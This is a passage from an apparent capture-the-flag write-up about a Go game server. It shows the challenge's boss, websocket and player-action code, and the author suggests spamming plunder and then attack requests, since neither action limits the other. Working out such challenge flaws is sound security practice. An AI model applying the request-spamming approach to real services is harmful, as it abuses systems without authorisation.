</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">277</span><span class="">		</span><span class="token keyword">if</span><span class=""> gameState </span><span class="token operator">==</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">278</span><span class="">			</span><span class="token keyword">return</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">279</span><span class="">		</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">280</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">281</span><span class="">		gameState</span><span class="token punctuation">.</span><span class="token function">TimeoutLose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">282</span><span class="">	</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">283</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">284</span><span class="">	time</span><span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">3</span><span class=""> </span><span class="token operator">*</span><span class=""> </span><span class="token number">1000</span><span class=""> </span><span class="token operator">*</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Millisecond</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">285</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">286</span><span class="">	</span><span class="token keyword">for</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">287</span><span class="">		time</span><span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class=""> </span><span class="token operator">*</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Millisecond</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">288</span><span class="">		gameState </span><span class="token operator">:=</span><span class=""> gameStates</span><span class="token punctuation">[</span><span class="">gameId</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">289</span><span class="">		</span><span class="token keyword">if</span><span class=""> gameState </span><span class="token operator">==</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">290</span><span class="">			</span><span class="token keyword">return</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">291</span><span class="">		</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">292</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">293</span><span class="">		v </span><span class="token operator">:=</span><span class=""> r2</span><span class="token punctuation">.</span><span class="token function">IntN</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">294</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">295</span><span class="">		</span><span class="token keyword">if</span><span class=""> v </span><span class="token operator">&lt;</span><span class=""> </span><span class="token number">20</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">296</span><span class="">			</span><span class="token keyword">if</span><span class=""> gameState</span><span class="token punctuation">.</span><span class="">bossHealth </span><span class="token operator">&lt;</span><span class=""> MaxBossHealth</span><span class="token operator">*</span><span class="token number">0.8</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">297</span><span class="">				healAmount </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">r2</span><span class="token punctuation">.</span><span class="token function">IntN</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token number">20</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">298</span><span class="">				gameState</span><span class="token punctuation">.</span><span class="token function">BossHeal</span><span class="token punctuation">(</span><span class="">healAmount</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">299</span><span class="">			</span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword">else</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">300</span><span class="">				damageAmount </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">r2</span><span class="token punctuation">.</span><span class="token function">IntN</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token number">5</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">301</span><span class="">				gameState</span><span class="token punctuation">.</span><span class="token function">BossAttack</span><span class="token punctuation">(</span><span class="">damageAmount</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">302</span><span class="">			</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">303</span><span class="">		</span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword">else</span><span class=""> </span><span class="token keyword">if</span><span class=""> v </span><span class="token operator">&lt;</span><span class=""> </span><span class="token number">35</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">304</span><span class="">			gameState</span><span class="token punctuation">.</span><span class="token function">BossSignalAttack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">305</span><span class="">			time</span><span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class=""> </span><span class="token operator">*</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Millisecond</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">306</span><span class="">			damageAmount </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">r2</span><span class="token punctuation">.</span><span class="token function">IntN</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token number">10</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">307</span><span class="">			gameState</span><span class="token punctuation">.</span><span class="token function">BossAttack</span><span class="token punctuation">(</span><span class="">damageAmount</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">308</span><span class="">		</span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword">else</span><span class=""> </span><span class="token keyword">if</span><span class=""> v </span><span class="token operator">&lt;</span><span class=""> </span><span class="token number">50</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">309</span><span class="">			damageAmount </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">r2</span><span class="token punctuation">.</span><span class="token function">IntN</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token number">5</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">310</span><span class="">			gameState</span><span class="token punctuation">.</span><span class="token function">BossAttack</span><span class="token punctuation">(</span><span class="">damageAmount</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">311</span><span class="">		</span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword">else</span><span class=""> </span><span class="token keyword">if</span><span class=""> v </span><span class="token operator">&lt;</span><span class=""> </span><span class="token number">65</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">312</span><span class="">			gameState</span><span class="token punctuation">.</span><span class="token function">BossSignalAttack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">313</span><span class="">		</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">314</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">315</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">316</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">317</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">s </span><span class="token operator">*</span><span class="">Server</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">WebsocketHandler</span><span class="token punctuation">(</span><span class="">w http</span><span class="token punctuation">.</span><span class="">ResponseWriter</span><span class="token punctuation">,</span><span class=""> r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">318</span><span class="">	</span><span class="token boolean">_</span><span class="token punctuation">,</span><span class=""> claims</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">_</span><span class=""> </span><span class="token operator">:=</span><span class=""> jwtauth</span><span class="token punctuation">.</span><span class="token function">FromContext</span><span class="token punctuation">(</span><span class="">r</span><span class="token punctuation">.</span><span class="token function">Context</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">319</span><span class="">	gameId </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">claims</span><span class="token punctuation">[</span><span class="token string">&quot;game_id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">float64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">320</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">321</span><span class="">	gameState </span><span class="token operator">:=</span><span class=""> gameStates</span><span class="token punctuation">[</span><span class="">gameId</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">322</span><span class="">	</span><span class="token keyword">if</span><span class=""> gameState </span><span class="token operator">==</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">323</span><span class="">		w</span><span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="">http</span><span class="token punctuation">.</span><span class="">StatusNotFound</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">324</span><span class="">		json</span><span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;message&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;Game not found&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">325</span><span class="">		</span><span class="token keyword">return</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">326</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">327</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">328</span><span class="">	conn</span><span class="token punctuation">,</span><span class=""> err </span><span class="token operator">:=</span><span class=""> upgrader</span><span class="token punctuation">.</span><span class="token function">Upgrade</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">,</span><span class=""> r</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">329</span><span class="">	</span><span class="token keyword">if</span><span class=""> err </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">330</span><span class="">		</span><span class="token keyword">return</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">331</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">332</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">333</span><span class="">	gameState</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">=</span><span class=""> conn
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">334</span><span class="">	gameState</span><span class="token punctuation">.</span><span class="token function">SyncJSON</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">335</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>Our goal is to plunder 800 emeralds, all while defeating the boss and not getting killed in the process.</p>
<p><img src="https://gist.github.com/user-attachments/assets/1f28d421-8fe1-45a5-9271-4fad8c6897bb" alt="image"/></p>
<p>Looking at the underlying logic for attacking, dodging, and plundering,</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (go)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">PlayerAttack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">(</span><span class="">success </span><span class="token builtin">bool</span><span class="token punctuation">,</span><span class=""> amount </span><span class="token builtin">int32</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">lastDodge</span><span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class=""> </span><span class="token operator">*</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Second</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">After</span><span class="token punctuation">(</span><span class="">time</span><span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">		</span><span class="token keyword">return</span><span class=""> </span><span class="token boolean">false</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">0</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">	amt </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">rand</span><span class="token punctuation">.</span><span class="token function">IntN</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token number">2</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">		gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;action&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;player_attack&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;amount&quot;</span><span class="token punctuation">:</span><span class=""> amt</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">	gs</span><span class="token punctuation">.</span><span class="">bossHealth </span><span class="token operator">-=</span><span class=""> amt
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">	gs</span><span class="token punctuation">.</span><span class="token function">SyncJSON</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">	</span><span class="token keyword">return</span><span class=""> </span><span class="token boolean">true</span><span class="token punctuation">,</span><span class=""> amt
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">PlayerDodge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">	gs</span><span class="token punctuation">.</span><span class="">lastDodge </span><span class="token operator">=</span><span class=""> time</span><span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">PlayerPlunder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">int32</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">lastDodge</span><span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class=""> </span><span class="token operator">*</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Second</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">After</span><span class="token punctuation">(</span><span class="">time</span><span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">		</span><span class="token keyword">return</span><span class=""> </span><span class="token boolean">false</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">0</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">25</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">	amount </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">rand</span><span class="token punctuation">.</span><span class="token function">IntN</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token number">2</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">	gs</span><span class="token punctuation">.</span><span class="">plundered </span><span class="token operator">+=</span><span class=""> amount
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">	</span><span class="token keyword">return</span><span class=""> </span><span class="token boolean">true</span><span class="token punctuation">,</span><span class=""> amount
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>it seems like attacking and plundering are only prevented after dodging, and don&#x27;t block the spam of each other. Then, a preliminary idea can be to just spam plunder until we reach 800 emeralds, then spam attack until we kill the boss.</p>
<p>Unfortunately, referencing the route handler again,</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (go)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">	r</span><span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">r chi</span><span class="token punctuation">.</span><span class="">Router</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">		r</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">middleware</span><span class="token punctuation">.</span><span class="">Logger</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">		r</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">middleware</span><span class="token punctuation">.</span><span class="token function">Timeout</span><span class="token punctuation">(</span><span class="">time</span><span class="token punctuation">.</span><span class="">Second </span><span class="token operator">*</span><span class=""> </span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
